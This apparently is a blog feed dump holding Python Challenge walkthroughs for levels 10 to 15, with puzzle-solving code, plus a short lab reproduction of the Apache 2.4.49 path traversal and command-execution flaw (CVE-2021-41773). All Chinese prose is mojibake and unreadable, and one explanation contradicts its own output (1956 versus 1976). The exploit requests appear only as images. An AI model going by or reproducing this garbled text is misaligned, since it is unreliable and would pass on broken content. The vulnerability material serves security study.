<p>å¤–è§‚åºåˆ—ï¼ˆLook-and-say sequenceï¼‰ï¼Œæ˜¯æŒ‡ä»¥ä¸‹ç‰¹ç‚¹çš„æ•´æ•°åºåˆ—ï¼š</p>
<p>1, 11, 21, 1211, 111221, 312211, 13112221, 1113213211, â€¦â€¦</p>
<p>å®ƒä»¥æ•°å­—1å¼€å§‹ï¼Œåºåˆ—çš„ç¬¬n+1é¡¹æ˜¯å¯¹ç¬¬né¡¹çš„æè¿°ã€‚æ¯”å¦‚ç¬¬2é¡¹æ˜¯2ä¸ª1ï¼Œæ‰€ä»¥ä¸‹ä¸€é¡¹ï¼ˆç¬¬ä¸‰é¡¹ï¼‰å°±æ˜¯21ã€‚åˆæ¯”å¦‚ç¬¬5é¡¹æ˜¯111221ï¼Œæè¿°å°±æ˜¯3ä¸ª1ï¼Œ2ä¸ª2ï¼Œ1ä¸ª1ï¼Œ æ‰€ä»¥ä¸‹ä¸€é¡¹å°±æ˜¯312211ã€‚</p>
</blockquote>
<h2 id="æ–¹æ³•-1-1">æ–¹æ³• 1</h2>
<p>ä»£ç å¦‚ä¸‹ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getNext</span>(<span class="params">res</span>):</span>  </span><br><span class="line">    index, <span class="built_in">next</span> = <span class="number">0</span>, <span class="string">&quot;&quot;</span>  </span><br><span class="line"> <span class="keyword">while</span> index &lt; <span class="built_in">len</span>(res):  </span><br><span class="line">	count = <span class="number">1</span>  </span><br><span class="line">	<span class="keyword">while</span> index &lt; <span class="built_in">len</span>(res) - <span class="number">1</span> <span class="keyword">and</span> res[index] == res[index+<span class="number">1</span>]:  </span><br><span class="line">		count += <span class="number">1</span>  </span><br><span class="line">		index += <span class="number">1</span>  </span><br><span class="line">	<span class="built_in">next</span> += <span class="built_in">str</span>(count) + res[index]  </span><br><span class="line">	index += <span class="number">1</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">next</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">countAndSay</span>(<span class="params">length</span>):</span>  </span><br><span class="line">    res = <span class="string">&#x27;1&#x27;</span>  </span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length-<span class="number">1</span>):  </span><br><span class="line">		res = getNext(res)</span><br><span class="line">	<span class="keyword">return</span>(res) </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(countAndSay(<span class="number">31</span>)))</span><br></pre></td></tr></table></figure></p>
<p><strong>ï¼ˆæ³¨æ„ï¼Œä¸€å®šæ˜¯ count åœ¨å‰ï¼Œres[index] åœ¨åï¼‰</strong></p>
<p>å¾—åˆ°ç»“æœï¼š5808</p>
<p>å› æ­¤ä¿®æ”¹ urlï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¿®æ”¹å‰ï¼šhttp://www.pythonchallenge.com/pc/return/bull.html</span><br><span class="line">ä¿®æ”¹åï¼šhttp://www.pythonchallenge.com/pc/return/5808.html</span><br></pre></td></tr></table></figure></p>
<h2 id="æ–¹æ³•-2-1">æ–¹æ³• 2</h2>
<p>åˆ©ç”¨æ­£åˆ™è¡¨è¾¾å¼æ›¿ä»£å¾ªç¯ã€‚ <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="built_in">print</span>(re.findall(<span class="string">r&#x27;(\d)(\1*)&#x27;</span>, <span class="string">&#x27;111221&#x27;</span>))</span><br></pre></td></tr></table></figure></p>
<p>ç»“æœä¸ºï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[(&#x27;1&#x27;, &#x27;11&#x27;), (&#x27;2&#x27;, &#x27;2&#x27;), (&#x27;1&#x27;, &#x27;&#x27;)]</span><br></pre></td></tr></table></figure></p>
<p>ï¼ˆå‡è®¾å…ƒç»„ç¬¬ä¸€ä¸ªå…ƒç´ ä¸º iï¼Œç¬¬äºŒä¸ªå…ƒç´ ä¸º jï¼‰é‚£ä¹ˆä¸æ–¹æ³• 1ç›¸æ¯”ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">value == res[index]</span><br><span class="line">count == len(str(i+j))</span><br></pre></td></tr></table></figure></p>
<p>å› æ­¤ï¼Œæœ€ç»ˆä»£ç å¦‚ä¸‹ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re  </span><br><span class="line">res = <span class="string">&#x27;1&#x27;</span>  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):  </span><br><span class="line">    res = <span class="string">&quot;&quot;</span>.join([<span class="built_in">str</span>(<span class="built_in">len</span>(i+j))+i <span class="keyword">for</span> i, j <span class="keyword">in</span> re.findall(<span class="string">r&#x27;(\d)(\1*)&#x27;</span>, res)])  </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(res))</span><br></pre></td></tr></table></figure></p>
<h1 id="level-11">level 11</h1>
<h2 id="é¢˜ç›®ä¿¡æ¯-11">é¢˜ç›®ä¿¡æ¯</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220202111336.png" /></p>
<p>æ³¨æ„ç½‘ç«™åå­—ï¼š<code>odd even</code></p>
<p>æœ¬é¢˜åªæœ‰ä¸¤ä¸ªä¿¡æ¯ï¼š</p>
<ol type="1">
<li>å›¾ç‰‡</li>
<li><code>odd even</code> ä¹Ÿå°±æ˜¯å¥‡æ•°ï¼Œå¶æ•°</li>
</ol>
<p>çŒœæµ‹ï¼š<strong>æŠŠå›¾ä¸­å¥‡æ•°å’Œå¶æ•°çš„åƒç´ ç‚¹åˆ†å¼€</strong></p>
<h2 id="æ–¹æ³•-12">æ–¹æ³•</h2>
<p>ä»£ç å¦‚ä¸‹ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image  </span><br><span class="line">path = <span class="string">&#x27;attachments/level_11/cave.jpg&#x27;</span>  </span><br><span class="line">img = Image.<span class="built_in">open</span>(path)  </span><br><span class="line">odd = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (img.width, img.height))  </span><br><span class="line">even = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (img.width, img.height))  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(img.width):  </span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(img.height):  </span><br><span class="line">		pixel = img.getpixel((i, j))  </span><br><span class="line">        <span class="keyword">if</span> (i + j) % <span class="number">2</span> == <span class="number">1</span>: <span class="comment"># odd  </span></span><br><span class="line">			odd.putpixel((i, j), pixel)  </span><br><span class="line">        <span class="keyword">else</span>:   <span class="comment"># even</span></span><br><span class="line">			even.putpixel((i, j), pixel)  </span><br><span class="line"></span><br><span class="line">odd.show()  </span><br><span class="line">even.show()</span><br></pre></td></tr></table></figure></p>
<p>å¾—åˆ°ä¸¤å¼ å›¾ç‰‡ï¼š <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220202111705.png" /></p>
<p>å³è¾¹é‚£å¼ ä¸­æœ‰ <code>evil</code> å­—æ ·ã€‚å› æ­¤ä¿®æ”¹ urlï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¿®æ”¹å‰ï¼šhttp://www.pythonchallenge.com/pc/return/5808.html</span><br><span class="line">ä¿®æ”¹åï¼šhttp://www.pythonchallenge.com/pc/return/evil.html</span><br></pre></td></tr></table></figure></p>
<h1 id="level-12">level 12</h1>
<h2 id="é¢˜ç›®ä¿¡æ¯-12">é¢˜ç›®ä¿¡æ¯</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220203091240.png" /></p>
<p>æŸ¥çœ‹æºç ï¼Œç‚¹å‡»å›¾ç‰‡é“¾æ¥å‘ç°ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.pythonchallenge.com/pc/return/evil1.jpg</span><br></pre></td></tr></table></figure></p>
<p>åé¢æœ‰æ•°å­—ï¼ŒçŒœæƒ³æŠŠæ•°å­—æ”¹ä¸€ä¸‹ä¼šä¸ä¼šæœ‰å…¶ä»–å›¾ç‰‡ï¼Œæœä¸å…¶ç„¶ã€‚ <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220203091406.png" alt="evil2.jpg" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220203091619.png" /></p>
<p>ä»¥ä¸Šåˆ†åˆ«æ˜¯2ï¼Œ3ã€‚æ³¨æ„åˆ°2ï¼Œå°†åç¼€ä¿®æ”¹ä¼šä¸‹è½½å¾—åˆ°ä¸€ä¸ªæ–‡ä»¶ã€‚å…¶å®4è¿˜æ˜¯æœ‰çš„ï¼Œè®¿é—®çš„æ—¶å€™å¹¶ä¸æ˜¯æ˜¾ç¤ºæ²¡æœ‰æ–‡ä»¶ï¼Œè€Œæ˜¯æ˜¾ç¤º <code>å› å­˜åœ¨é”™è¯¯è€Œæ— æ³•æ˜¾ç¤º</code>ï¼Œåˆ©ç”¨ä¸‹é¢å‘½ä»¤è®¿é—®ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -u huge:file http://www.pythonchallenge.com/pc/return/evil4.jpg</span><br></pre></td></tr></table></figure></p>
<p>å¾—åˆ°ä¸€å¥è¯ <code>Bert is evil! go back!</code>ã€‚è¿™ä¹ˆçœ‹æ¥ï¼Œä¿¡æ¯åº”è¯¥å°±åœ¨åˆšåˆšä¸‹è½½çš„æ–‡ä»¶é‡Œã€‚</p>
<p>æ³¨æ„åˆ°ç¬¬ä¸€å¼ å›¾ç‰‡ä¸­å°†ç‰Œåˆ†ä¸ºäº† 5 å ï¼ˆdealing the cards into 5 stacksï¼‰ï¼Œæ ¹æ®ç½‘ç«™å <code>deal evil</code> ï¼Œé‚£ä¹ˆçŒœæµ‹ï¼š<strong>å°†ä¸‹è½½çš„æ–‡ä»¶æ•°æ®ä¹Ÿåˆ†ä¸º 5 å ã€‚</strong></p>
<h2 id="æ–¹æ³•-13">æ–¹æ³•</h2>
<p>ä»£ç å¦‚ä¸‹ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">path = <span class="string">&#x27;attachments/level_12/evil2.gfx&#x27;</span></span><br><span class="line">data = <span class="built_in">open</span>(path, <span class="string">&#x27;rb&#x27;</span>).read()  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):  </span><br><span class="line">    <span class="built_in">open</span>(<span class="string">&#x27;attachments/level_12/%d.jpg&#x27;</span> % i, <span class="string">&#x27;wb&#x27;</span>).write(data[i::<span class="number">5</span>])</span><br></pre></td></tr></table></figure></p>
<p>ç»“æœï¼š <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220203093800.png" /></p>
<p>ç”±äº 4 è¢«åˆ’æ‰ï¼Œä¸åšè€ƒè™‘ã€‚åˆ†åˆ«æ˜¯ï¼š<code>dis, pro, port, ional</code> ï¼Œä¿®æ”¹ urlï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¿®æ”¹å‰ï¼šhttp://www.pythonchallenge.com/pc/return/evil.html</span><br><span class="line">ä¿®æ”¹åï¼šhttp://www.pythonchallenge.com/pc/return/disproportional.html</span><br></pre></td></tr></table></figure></p>
<h1 id="level-13">level 13</h1>
<h2 id="é¢˜ç›®ä¿¡æ¯-13">é¢˜ç›®ä¿¡æ¯</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220203101659.png" /></p>
<p>æŸ¥çœ‹é¡µé¢æºç å‘ç°ï¼š - <code>phone that &lt;remote /&gt; evil</code> - <code>5</code> å¯ä»¥ç‚¹å‡»ï¼Œç»“æœä¸ºï¼š<code>faultCode 105 faultString XML error 5: empty document</code></p>
<p>æŸ¥è¯¢ stack overflowï¼Œè¿™ä¸ªæŠ¥é”™çš„ä¿¡æ¯æ˜¯å› ä¸ºï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">It looks from the response like you didn&#x27;t submit an xml &#x27;request&#x27; document to the url. XMLRPC requires that you post a request in the form of commands via an xml file.</span><br><span class="line"></span><br><span class="line">æ²¡æœ‰æäº¤ xml è¯·æ±‚ã€‚</span><br></pre></td></tr></table></figure></p>
<p>æ•…å¯ä»¥åˆ©ç”¨ xmlrpc åº“è¯·æ±‚ã€‚</p>
<h2 id="æ–¹æ³•-14">æ–¹æ³•</h2>
<p>å…ˆæŸ¥çœ‹æœ‰å“ªäº›æ–¹æ³•ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xmlrpc.client  </span><br><span class="line">connect = xmlrpc.client.ServerProxy(<span class="string">&#x27;http://www.pythonchallenge.com/pc/phonebook.php&#x27;</span>)  </span><br><span class="line"><span class="built_in">print</span>(connect.system.listMethods())</span><br><span class="line">````</span><br><span class="line"></span><br><span class="line">ç»“æœï¼š</span><br></pre></td></tr></table></figure> ['phone', 'system.listMethods', 'system.methodHelp', 'system.methodSignature', 'system.multicall', 'system.getCapabilities'] <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ï¼ˆæ³¨æ„åˆ° `phone`ï¼‰</span><br><span class="line"></span><br><span class="line">æŸ¥çœ‹ phone æ–¹æ³•çš„**å¸®åŠ©**å’Œ**è¾“å…¥ä¸è¾“å‡º**ï¼š</span><br><span class="line">```python</span><br><span class="line">print(connect.system.methodHelp(&#x27;phone&#x27;))  </span><br><span class="line">print(connect.system.methodSignature(&#x27;phone&#x27;))</span><br></pre></td></tr></table></figure></p>
<p>ç»“æœï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Returns the phone of a person</span><br><span class="line">[[&#x27;string&#x27;, &#x27;string&#x27;]]</span><br></pre></td></tr></table></figure></p>
<p>è¯¥æ–¹æ³•éœ€è¦è¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚é‚£ä¹ˆè¾“å…¥çš„å­—ç¬¦ä¸²åº”è¯¥æ˜¯äººåï¼Œè€Œè¿”å›çš„å­—ç¬¦ä¸²åº”è¯¥æ˜¯å¯¹åº”çš„ç”µè¯å·ç ã€‚æ³¨æ„åˆ°ä¸Šä¸€å…³çš„ <code>Bert is evil! go back!</code>ï¼Œé‚£ä¹ˆè¿™é‡Œåº”è¯¥è¾“å…¥ <code>Bert</code>ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(connect.phone(<span class="string">&#x27;Bert&#x27;</span>))</span><br></pre></td></tr></table></figure></p>
<p>ç»“æœï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">555-ITALY</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>å†·çŸ¥è¯†ï¼š<code>555</code> basically means "fake phone numbers" in US...</p>
</blockquote>
<p>å› æ­¤ä¿®æ”¹ urlï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¿®æ”¹å‰ï¼šhttp://www.pythonchallenge.com/pc/return/disproportional.html</span><br><span class="line">ä¿®æ”¹åï¼šhttp://www.pythonchallenge.com/pc/return/italy.html</span><br></pre></td></tr></table></figure></p>
<h1 id="level-14">level 14</h1>
<h2 id="é¢˜ç›®ä¿¡æ¯-14">é¢˜ç›®ä¿¡æ¯</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220203110227.png" /></p>
<p>æŸ¥çœ‹é¡µé¢æºç ï¼š <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220203110246.png" /></p>
<p>è®¿é—® wire.png ï¼Œå‘ç°çœŸæ­£çš„å°ºå¯¸æ˜¯ 10000 * 1ã€‚</p>
<p>æ€»ç»“ä¸€ä¸‹ä¿¡æ¯ï¼š</p>
<ol type="1">
<li><code>100*100 = (100+99+99+98) + (...</code></li>
<li>wire.png æ˜¯ <code>10000*1</code>ï¼Œè€Œæ˜¾ç¤ºå‡ºæ¥çš„æ˜¯ <code>100*100</code></li>
<li>HTML æ ‡é¢˜ä¸º <code>walk around</code></li>
</ol>
<p>çŒœæµ‹ï¼š<strong>å°† <code>10000*1</code> çš„å›¾ç‰‡æŒ‰æŸç§æ–¹å¼å·èµ·æ¥ï¼Œå½¢æˆä¸€ä¸ª <code>100*100</code> çš„å›¾ç‰‡ï¼Œå·çš„æ–¹å¼åº”è¯¥å°±æ˜¯ <code>(100+99+99+98) + (..</code>ã€‚å°±æ˜¯ç±»ä¼¼è¿™æ ·ï¼š</strong> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220203111001.png" /> ï¼ˆå…ˆå‘å³100ï¼Œç„¶åå‘ä¸‹99ï¼Œå‘å·¦99ï¼Œå‘ä¸Š98ï¼›å‘å³98 ...ï¼‰</p>
<h2 id="æ–¹æ³•-15">æ–¹æ³•</h2>
<p>ä»£ç å¦‚ä¸‹ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw  </span><br><span class="line">path = <span class="string">&#x27;attachments/level_14/wire.png&#x27;</span>  </span><br><span class="line">img = Image.<span class="built_in">open</span>(path)  </span><br><span class="line"><span class="built_in">print</span>(img.size, img.mode, img.<span class="built_in">format</span>)  </span><br><span class="line">out = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (<span class="number">100</span>, <span class="number">100</span>))  </span><br><span class="line">d = <span class="number">200</span>  </span><br><span class="line">delta = [(<span class="number">1</span>, <span class="number">0</span>), (<span class="number">0</span>, <span class="number">1</span>), (-<span class="number">1</span>, <span class="number">0</span>), (<span class="number">0</span>, -<span class="number">1</span>)]  </span><br><span class="line">x, y, i = -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>  <span class="comment"># å› ä¸ºç¬¬ä¸€æ¬¡è¦ +100ï¼Œæ‰€ä»¥ x åˆå§‹ä¸º -1</span></span><br><span class="line"><span class="keyword">while</span> d/<span class="number">2</span> &gt; <span class="number">0</span>:  </span><br><span class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> delta:  </span><br><span class="line">        steps = d // <span class="number">2</span></span><br><span class="line">		<span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(steps):  </span><br><span class="line">            x, y = x + v[<span class="number">0</span>], y + v[<span class="number">1</span>]  </span><br><span class="line">            out.putpixel((x, y), img.getpixel((i, <span class="number">0</span>)))  </span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">		d -= <span class="number">1</span>  </span><br><span class="line">out.show()</span><br></pre></td></tr></table></figure></p>
<p>ç»“æœï¼š <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220203111203.png" /></p>
<p>å½“è®¿é—® <code>http://www.pythonchallenge.com/pc/return/cat.html</code> æ—¶ï¼Œå‡ºç°ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220206223856.png" /></p>
<p>å› æ­¤ç”¨ uzi æ›¿ä»£ catï¼Œä¿®æ”¹ urlï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¿®æ”¹å‰ï¼šhttp://www.pythonchallenge.com/pc/return/cat.html</span><br><span class="line">ä¿®æ”¹åï¼šhttp://www.pythonchallenge.com/pc/return/uzi.html</span><br></pre></td></tr></table></figure></p>
<h1 id="level-15">level 15</h1>
<h2 id="é¢˜ç›®ä¿¡æ¯-15">é¢˜ç›®ä¿¡æ¯</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220206225138.png" /></p>
<p>æŸ¥çœ‹é¡µé¢æºç ï¼š <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220206225159.png" /></p>
<p>ä¿¡æ¯æ€»ç»“ï¼š</p>
<ol type="1">
<li>æ—¥å†ä¸Šæ˜¾ç¤ºçš„åº”è¯¥æ˜¯ <code>1xx6</code> å¹´ï¼›</li>
<li>æ³¨æ„æœ€å³ä¸‹è§’çš„å…¶å®æ˜¯2æœˆï¼Œæœ‰ 29 å¤©ï¼Œè¯´æ˜åº”è¯¥æ˜¯é—°å¹´ï¼›</li>
<li>ä»–ä¸æ˜¯æœ€å¹´è½»çš„ï¼Œè€Œæ˜¯ç¬¬äºŒå¹´è½»çš„</li>
<li>è¦åšçš„äº‹ï¼šä¸ºæ˜å¤©ä¹°èŠ±</li>
<li>ç½‘é¡µæ ‡é¢˜ï¼š<code>whom?</code></li>
</ol>
<p>çŒœæµ‹ï¼šéœ€è¦é€šè¿‡ç”Ÿæ—¥æ‰¾å‡ºè¿™ä¸ªäººæ˜¯è°ã€‚</p>
<h2 id="æ–¹æ³•-16">æ–¹æ³•</h2>
<ol type="1">
<li>æ‰¾å‡º 1006 åˆ° 1996 ä¹‹é—´çš„æ»¡è¶³ 1.26 æ˜¯å‘¨ä¸€çš„æ‰€æœ‰é—°å¹´ã€‚ä»£ç å¦‚ä¸‹ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime, calendar  </span><br><span class="line"><span class="keyword">for</span> year <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1006</span>, <span class="number">1997</span>, <span class="number">10</span>):  </span><br><span class="line">    d = datetime.date(year, <span class="number">1</span>, <span class="number">26</span>)  </span><br><span class="line">    <span class="keyword">if</span> d.isoweekday() == <span class="number">1</span> <span class="keyword">and</span> calendar.isleap(year):  <span class="comment"># åˆ¤æ–­æ˜¯å¦ä¸ºé—°å¹´ï¼Œ1ï¼Œ26æ˜¯å¦ä¸ºå‘¨ä¸€</span></span><br><span class="line">        <span class="built_in">print</span>(d)</span><br></pre></td></tr></table></figure></li>
</ol>
<p>ç»“æœä¸ºï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1176-01-26</span><br><span class="line">1356-01-26</span><br><span class="line">1576-01-26</span><br><span class="line">1756-01-26</span><br><span class="line">1976-01-26</span><br></pre></td></tr></table></figure></p>
<p>ç„¶åï¼Œæ ¹æ® "ä»–ä¸æ˜¯æœ€å¹´è½»çš„ï¼Œè€Œæ˜¯ç¬¬äºŒå¹´è½»çš„"ï¼ŒçŒœæµ‹åº”è¯¥æ˜¯ 1756 å¹´ï¼Œæœ€å¹´è½»çš„æ˜¯1956å¹´ã€‚ï¼Œå†æ ¹æ®"è¦åšçš„äº‹ï¼šä¸ºæ˜å¤©ä¹°èŠ±"ï¼ŒçŒœæµ‹ä»–çš„ç”Ÿæ—¥åº”è¯¥æ˜¯ 1756.1.27ï¼Œç™¾åº¦å‘ç°ï¼Œé‚£å¤©æ˜¯è«æ‰ç‰¹ï¼ˆMozartï¼‰çš„ç”Ÿæ—¥ï¼Œä¿®æ”¹ urlï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¿®æ”¹å‰ï¼šhttp://www.pythonchallenge.com/pc/return/uzi.html</span><br><span class="line">ä¿®æ”¹åï¼šhttp://www.pythonchallenge.com/pc/return/mozart.html</span><br></pre></td></tr></table></figure></p>
<h1 id="é™„å½•">é™„å½•</h1>
<ol type="1">
<li>ç½‘å€ï¼š<a href="http://www.pythonchallenge.com/">python challenge</a></li>
<li>è§£æ³•ï¼š<a href="https://www.hackingnote.com/en/python-challenge-solutions/overview">python challenge solutions</a></li>
</ol>
]]></content>
      <categories>
        <category>python</category>
        <category>åˆ·é¢˜</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>å¤ç°ï¼šApache HTTP Server 2.4.49 è·¯å¾„ç©¿è¶Šæ¼æ´ï¼ˆCVE-2021-41773ï¼‰</title>
    <url>/2022/03/24/%E5%A4%8D%E7%8E%B0%EF%BC%9AApache%20HTTP%20Server%202.4.49%20%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-41773%EF%BC%89/</url>
    <content><![CDATA[<p>ä¸ªäººçš„æ¼æ´å¤ç°ç»ƒä¹ ï¼Œè¯·å¤šæ‰¹è¯„ï¼</p>
<span id="more"></span>
<h1 id="æ¼æ´ä¿¡æ¯">æ¼æ´ä¿¡æ¯</h1>
<p>Apache HTTP Serveræ˜¯ApacheåŸºé‡‘ä¼šå¼€æºçš„ä¸€æ¬¾æµè¡Œçš„HTTPæœåŠ¡å™¨ã€‚åœ¨å…¶2.4.49ç‰ˆæœ¬ä¸­ï¼Œå¼•å…¥äº†ä¸€ä¸ªè·¯å¾„ç©¿è¶Šæ¼æ´ï¼Œæ»¡è¶³ä¸‹é¢ä¸¤ä¸ªæ¡ä»¶çš„ApacheæœåŠ¡å™¨å°†ä¼šå—åˆ°å½±å“ï¼š</p>
<ul>
<li><p>ç‰ˆæœ¬ç­‰äº2.4.49</p></li>
<li><p>ç©¿è¶Šçš„ç›®å½•å…è®¸è¢«è®¿é—®ï¼Œæ¯”å¦‚é…ç½®äº†<code>&lt;Directory /&gt;Require all granted&lt;/Directory&gt;</code>ã€‚ï¼ˆé»˜è®¤æƒ…å†µä¸‹æ˜¯ä¸å…è®¸çš„ï¼‰</p></li>
</ul>
<p>æ”»å‡»è€…åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œå¯ä»¥è¯»å–ä½äºApacheæœåŠ¡å™¨Webç›®å½•ä»¥å¤–çš„å…¶ä»–æ–‡ä»¶ï¼Œæˆ–è€…è¯»å–Webç›®å½•ä¸­çš„è„šæœ¬æ–‡ä»¶æºç ï¼Œæˆ–è€…åœ¨å¼€å¯äº†cgiæˆ–cgidçš„æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p>
<p>å‚è€ƒé“¾æ¥ï¼š</p>
<ul>
<li><p>https://httpd.apache.org/security/vulnerabilities_24.html</p></li>
<li><p>https://twitter.com/ptswarm/status/1445376079548624899</p></li>
<li><p>https://twitter.com/HackerGautam/status/1445412108863041544</p></li>
<li><p>https://twitter.com/snyff/status/1445565903161102344</p></li>
</ul>
<p>è·¯å¾„ï¼š</p>
<ul>
<li><code>vulhub-master/httpd/CVE-2021-41773</code></li>
</ul>
<p>è¿è¡Œæ¼æ´ç¯å¢ƒï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build  </span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
<p>ç„¶åè¾“å…¥ï¼š<code>http://ip:8080</code> å³å¯è®¿é—®</p>
<h1 id="å¤ç°">å¤ç°</h1>
<p>è¿›å…¥ç¯å¢ƒï¼Œæ˜¾ç¤ºå¦‚ä¸‹åˆ™ç¯å¢ƒæ­å»ºæˆåŠŸã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324231656.png" /></p>
<p>å…ˆåˆ·æ–°ï¼ŒæŠ“ä¸ªåŒ…ï¼Œç„¶åå°†è¯·æ±‚åœ°å€ä¿®æ”¹ä¸ºå¦‚ä¸‹ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324231754.png" /></p>
<p>ç»“æœå¦‚ä¸‹ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324231803.png" /></p>
<p>æˆåŠŸå¾—åˆ°æ–‡ä»¶çš„å†…å®¹ï¼Œå› æ­¤è¯æ˜å­˜åœ¨æ­¤æ¼æ´ã€‚</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<code>icons</code> éœ€è¦ä¸ºç›®æ ‡ä¸»æœºå­˜åœ¨ä¸”å¯è®¿é—®çš„ç›®å½•ã€‚<code>%2e</code> æ˜¯ <code>.</code> çš„ url ç¼–ç ï¼Œå¦‚æœç›´æ¥åœ¨æµè§ˆå™¨è¾“å…¥çš„è¯ï¼Œè¦è¾“å…¥ <code>.</code> ã€‚</p>
<p>æ¥ä¸‹æ¥æ”¹å˜è¯·æ±‚çš„æ–¹å¼ï¼Œå‘é€å¦‚ä¸‹è¯·æ±‚ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324232016.png" /></p>
<p>ç»“æœå¦‚ä¸‹ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324232026.png" /></p>
<p>æˆåŠŸæ‰§è¡Œå‘½ä»¤ã€‚</p>
<h1 id="æ€»ç»“">æ€»ç»“</h1>
<p>ä»Šå¤©åˆ·çš„ä¸€å¥—é¢˜å°±æ˜¯ç±»ä¼¼çš„è·¯å¾„ç©¿è¶Šæ¼æ´ï¼ˆ<a href="https://buuoj.cn/challenges">BUUCTF</a> ä¸­çš„ <strong>æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</strong>ï¼‰ï¼Œè¿™ç±»çš„é¢˜ç›®è¿˜æ˜¯éœ€è¦å¹³æ—¶å¤šè®°å½•ã€‚</p>
]]></content>
      <categories>
        <category>æ¼æ´å¤ç°</category>
      </categories>
      <tags>
        <tag>Apache</tag>
      </tags>
  </entry>
  <entry>
    <title>å¤ç°ï¼šApache HTTPD æ¢è¡Œè§£ææ¼æ´ï¼ˆCVE-2017-15715ï¼‰</title>
